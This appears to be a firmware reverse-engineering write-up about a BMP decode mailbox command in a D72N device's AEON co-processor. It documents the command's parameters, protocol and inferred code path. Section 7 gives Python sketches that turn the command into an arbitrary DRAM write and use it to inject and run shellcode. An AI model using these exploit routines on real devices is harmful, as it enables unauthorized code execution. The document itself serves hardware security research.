# MB_BMP_CMD_DECODE_MEM_OUT Function Trace

Complete analysis of the BMP decode-to-memory mailbox command in D72N AEON.

## Summary

| Property | Value |
|----------|-------|
| Command Byte | 0x10 (inferred) |
| Debug String | 0x4cffc |
| Parameters | 7 bytes |
| Function | Decode BMP to arbitrary DRAM address |

## Critical Security Note

This command provides an **arbitrary DRAM write primitive**. Decoded BMP pixel data is written to any specified address, enabling:
- Code injection into executable regions
- Function pointer overwrites
- Exception vector modification

---

## 1. Debug String Analysis

### Primary Debug Output

```
Address: 0x4cffc
String:  [MB_BMP_CMD_DECODE_MEM_OUT] addr %lx pitch %u down factor %u
```

The format string reveals three parameters:
- `addr` (%lx) - 32-bit DRAM destination address
- `pitch` (%u) - 16-bit line stride in bytes
- `down factor` (%u) - 16-bit downscale factor

### Related Debug Strings (Call Flow)

| Address | String | Stage |
|---------|--------|-------|
| 0x4cfdf | `BMP roi L %u T %u W %u H %u` | ROI setup |
| 0x4cffc | `[MB_BMP_CMD_DECODE_MEM_OUT]...` | Command entry |
| 0x4d03a | `[BMP] CHANGE_SCALEFACT scale fact %d` | Scale calculation |
| 0x4e538 | `[BMP%dBitMode] ScaledPix %u LineSize %u` | Bit depth handling |
| 0x4e62f | `[BMP] scale Pix %d, width %d height %d` | Dimension setup |
| 0x4e6e2 | `[BMP ]u16ScalePix %d` | Pixel scaling |
| 0x4e71d | `[BMP]start %d, end %d, time taken : %d ticks` | Decode timing |
| 0x4e764 | `[BMP]decode done.Data ends at 0x%x` | Completion |

---

## 2. Mailbox Protocol

### Command Structure

```
XDATA Layout:
  0x4401: Command byte (0x10 for BMP_DECODE_MEM_OUT)
  0x4402: addr[7:0]   - DRAM address byte 0
  0x4403: addr[15:8]  - DRAM address byte 1
  0x4404: addr[23:16] - DRAM address byte 2
  0x4405: addr[31:24] - DRAM address byte 3
  0x4406: pitch[7:0]  - Pitch low byte
  0x4407: pitch[15:8] - Pitch high byte
  0x4408: down_factor - Downscale factor
```

### Execution Sequence

```
1. PM51 writes command (0x10) to 0x4401
2. PM51 writes parameters to 0x4402-0x4408
3. PM51 clears sync flag (0x4417 = 0x00)
4. AEON reads command and parameters
5. AEON decodes BMP from source buffer
6. AEON writes RGB pixels to target DRAM address
7. AEON sets completion status in 0x40FB
```

---

## 3. Parameter Details

### addr (32-bit)

Target DRAM address for decoded output.

| Value | Usage |
|-------|-------|
| 0x100000 | Main decode buffer (safe) |
| 0x0C0000 | Secondary buffer (safe) |
| 0x150000 | Output buffer (safe) |
| Any | Arbitrary write (dangerous) |

### pitch (16-bit)

Bytes per output line. Must match:
```
pitch = width * bytes_per_pixel
```

For 24-bit BMP: `pitch = width * 3`
For 16-bit BMP: `pitch = width * 2`

### down_factor (16-bit)

Downscale divisor for output.

| Value | Effect |
|-------|--------|
| 1 | Full resolution |
| 2 | 1/2 size (skip every other pixel) |
| 4 | 1/4 size |
| n | 1/n size |

---

## 4. AEON Execution Flow

### Inferred Code Path

```
mailbox_handler():
    cmd = read_xdata(0x4401)

    switch(cmd):
        case 0x10:  // MB_BMP_CMD_DECODE_MEM_OUT
            bmp_decode_mem_out()
            break

bmp_decode_mem_out():
    // Read parameters
    addr = read_xdata_32(0x4402)
    pitch = read_xdata_16(0x4406)
    down_factor = read_xdata(0x4408)

    // Debug output
    printf("[MB_BMP_CMD_DECODE_MEM_OUT] addr %lx pitch %u down factor %u",
           addr, pitch, down_factor)

    // Get ROI parameters (set by prior command or defaults)
    printf("BMP roi L %u T %u W %u H %u", roi_l, roi_t, roi_w, roi_h)

    // Decode BMP header from source buffer
    bmp_header = parse_bmp_header(source_buffer)

    // Handle bit depth
    printf("[BMP%dBitMode] ScaledPix %u LineSize %u",
           bmp_header.bits, scaled_pix, line_size)

    // Decode loop
    start_time = get_ticks()

    for each scanline:
        decode_line(source, line_buffer)
        scale_line(line_buffer, down_factor)
        write_dram(addr + y * pitch, output_line, pitch)

    end_time = get_ticks()
    printf("[BMP]start %d, end %d, time taken : %d ticks",
           start_time, end_time, end_time - start_time)

    printf("[BMP]decode done.Data ends at 0x%x", addr + height * pitch)

    // Signal completion
    write_xdata(0x40FB, COMPLETE)
```

---

## 5. BMP Format Support

### Supported Bit Depths

From string `[BMP%dBitMode]`:

| Bits | Format | Bytes/Pixel |
|------|--------|-------------|
| 1 | Monochrome | 1/8 |
| 4 | 16-color palette | 1/2 |
| 8 | 256-color palette | 1 |
| 16 | RGB565/555 | 2 |
| 24 | RGB888 | 3 |
| 32 | ARGB8888 | 4 |

### BMP Header Parsing

The "BM" magic (0x424D) appears 12 times in code, indicating header validation.

---

## 6. DRAM Buffer References

### Buffer Usage (from code analysis)

| Address | LE Refs | BE Refs | Purpose |
|---------|---------|---------|---------|
| 0x100000 | 1027 | 888 | Main decode buffer |
| 0x0C0000 | 697 | 673 | Secondary buffer |
| 0x150000 | 511 | 384 | Output buffer |

---

## 7. Exploitation

### Arbitrary Write Primitive

```python
def bmp_arbitrary_write(target_addr, payload):
    """
    Write arbitrary data to DRAM via BMP decode

    Args:
        target_addr: 32-bit DRAM destination
        payload: Bytes to write (as BMP pixel data)
    """

    # Create BMP with payload as pixel data
    # Width = len(payload), Height = 1, 24-bit color
    bmp = create_bmp_header(len(payload), 1, 24)
    bmp += payload  # RGB values = shellcode bytes

    # Load BMP to source buffer (via SD card or USB)
    load_bmp_to_source(bmp)

    # Send mailbox command
    params = [
        target_addr & 0xFF,
        (target_addr >> 8) & 0xFF,
        (target_addr >> 16) & 0xFF,
        (target_addr >> 24) & 0xFF,
        len(payload) & 0xFF,      # pitch low
        (len(payload) >> 8) & 0xFF,  # pitch high
        1,                         # down_factor = 1 (no scaling)
    ]

    send_mailbox_command(0x10, params)
```

### Code Injection

```python
def inject_shellcode(shellcode, exec_addr=0x100000):
    """
    Inject and execute shellcode via BMP decode
    """

    # Pad shellcode to align with RGB triplets
    while len(shellcode) % 3 != 0:
        shellcode += b'\x00'

    # Write shellcode to executable region
    bmp_arbitrary_write(exec_addr, shellcode)

    # Trigger execution via:
    # - Function pointer overwrite
    # - Exception vector modification
    # - Return address corruption
```

### Via SERDB

```python
def serdb_bmp_exploit(target_addr, data):
    """
    Trigger BMP decode via SERDB without SD/USB
    """

    # 1. Write BMP data directly to source buffer
    source_buffer = 0x100000
    for i, byte in enumerate(create_bmp(data)):
        write_dram(source_buffer + i, byte)

    # 2. Set up mailbox parameters
    write_xdata(0x4401, 0x10)  # BMP_DECODE_MEM_OUT
    write_xdata(0x4402, target_addr & 0xFF)
    write_xdata(0x4403, (target_addr >> 8) & 0xFF)
    write_xdata(0x4404, (target_addr >> 16) & 0xFF)
    write_xdata(0x4405, (target_addr >> 24) & 0xFF)
    write_xdata(0x4406, len(data) & 0xFF)
    write_xdata(0x4407, (len(data) >> 8) & 0xFF)
    write_xdata(0x4408, 1)

    # 3. Trigger command
    write_xdata(0x4417, 0x00)

    # 4. Wait for completion
    while read_xdata(0x40FB) != 0xFE:
        time.sleep(0.001)
```

---

## 8. Limitations

### Static Analysis Constraints

- AEON R2 uses variable-length instructions (16/24/32-bit)
- No symbol table available
- String references use indirect addressing (base + offset)
- Exact function boundaries not determined

### What We Know

| Aspect | Confidence |
|--------|------------|
| Command byte (0x10) | Medium (inferred) |
| Parameter layout | High (from format string) |
| DRAM addressing | High (from buffer refs) |
| Mailbox protocol | High (same as similar MStar AEON device) |

### What Needs Hardware Verification

- Exact command byte value
- Source buffer location/size
- ROI parameter interaction
- Error handling behavior

---

## 9. Related Commands

| Command | Byte | Description |
|---------|------|-------------|
| MB_JPD_CMD_IMAGE_DROP | 0x06* | JPEG ROI cropping |
| MB_BMP_CMD_DECODE_MEM_OUT | 0x10* | This command |
| MB_TIFF_CMD_DECODE_MEM_OUT | 0x22* | TIFF to memory |

*Inferred values

---

## Related Documentation

- [D72N_SERDB_CONTROL.md](D72N_SERDB_CONTROL.md) - SERDB interface
- [D72N_SECURITY_ANALYSIS.md](D72N_SECURITY_ANALYSIS.md) - Vulnerability analysis
- [D72N_INDEX.md](D72N_INDEX.md) - D72N documentation index
